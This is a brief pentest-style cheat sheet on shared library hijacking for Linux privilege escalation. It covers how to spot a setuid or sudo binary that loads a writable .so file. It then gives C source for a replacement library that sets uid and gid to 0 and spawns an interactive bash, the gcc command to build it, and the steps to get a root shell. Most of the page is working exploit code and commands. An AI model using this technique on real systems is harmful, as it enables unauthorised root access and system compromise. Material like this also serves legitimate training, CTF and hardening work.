# Shared Library Hijacking

### Investigation <a href="#investigation" id="investigation"></a>

When we find the binary file as setuid or sudo command, check the strings of the binary file.

```shellscript
strings ./example
strace ./example
gdb ./example

...
foo.so
...
```

If the binary file uses a shared library (e.g. **`foo.so`**) and this library can be modified, we can update it and get a root shell.

```shellscript
find / -type f -name "foo.so" 2>/dev/null
ls -al /path/to/foo.so

drwxrwxrwx 1 user user 64 Dec 15 09:13 foo.so
```

### Exploitation <a href="#exploitation" id="exploitation"></a>

Create **"foo.c"**.

```shellscript
#include <stdlib.h>
#include <unistd.h>

void foo() {
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
}
```

Then compile it to shared object.

```
gcc -shared -fPIC -nostartfiles -o foo.so foo.c
```

Put the shared file to **`/path/to/foo.so`** .\
Now run the binary.

```
./example
# or
sudo ./example
```

We should get a root shell.
